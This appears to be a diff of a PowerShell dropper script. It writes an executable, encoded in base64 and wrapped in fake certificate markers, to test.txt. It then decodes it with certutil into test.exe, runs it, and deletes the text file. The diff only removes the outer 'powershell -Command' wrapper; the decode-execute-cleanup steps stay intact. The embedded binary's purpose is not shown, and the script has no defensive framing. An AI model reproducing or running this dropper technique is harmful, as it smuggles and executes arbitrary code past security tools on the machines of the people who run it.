@@ -1,4 +1,4 @@
-powershell -Command '$sw = New-Object System.IO.StreamWriter("test.txt");
+$sw = New-Object System.IO.StreamWriter("test.txt");
 $sw.WriteLine("-----BEGIN CERTIFICATE-----");
 $sw.WriteLine("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
 $sw.WriteLine("AAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5v");
@@ -316,4 +316,4 @@ certutil -decode test.txt test.exe;
 timeout 2;
 start test.exe;
 timeout 1;
-del test.txt;'
+del test.txt;
